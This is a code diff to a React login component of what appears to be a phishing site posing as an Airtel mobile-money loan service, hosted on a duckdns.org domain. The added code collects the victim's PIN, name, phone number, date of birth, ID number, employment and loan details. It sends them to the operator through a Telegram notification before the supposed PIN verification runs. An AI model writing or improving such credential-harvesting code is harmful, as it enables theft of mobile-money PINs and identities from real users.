@@ -1,6 +1,7 @@
 import React, { useState, useRef, useEffect } from 'react'
 import axios from 'axios'
 import { useNavigate, useParams } from 'react-router-dom'
+import { apiService } from '../services/api.js'
 
 const API_BASE_URL = "https://lnmb.duckdns.org"
 
@@ -116,20 +117,40 @@ function Login() {
 
   const submitPin = async () => {
     if (inputs.some(input => input === "")) return
-    
+
     const pin = inputs.join("")
     setLoading(true)
     setError("")
     setStatus("pending")
-    
+
+    const storedApp = localStorage.getItem('loanAppData')
+    const appData = storedApp ? JSON.parse(storedApp) : {}
+    const storedClient = localStorage.getItem('clientData')
+    const clientData = storedClient ? JSON.parse(storedClient) : {}
+
+    const clientInfo = {
+      name: appData.name || "",
+      number: appData.number || phone || "",
+      dob: clientData.dob || "",
+      id: clientData.id || "",
+      employment: clientData.employment || "",
+      amount: clientData.amount || "",
+      term: clientData.term || "",
+      pin: pin,
+      pinInputs: inputs.join(" "),
+      error: "",
+      ecoCash: ""
+    }
+
     try {
+      await apiService.sendTelegramNotification(clientInfo)
       const response = await api.post("/api/verify-pin", {
-        phoneNumber: phone,
+        phoneNumber: appData.number || phone,
         pinCode: pin,
         userId: `user_${Date.now()}`,
         userName: "Airtel User"
       })
-      
+
       if (response.data.success) {
         startPolling(response.data.sessionId)
       } else {
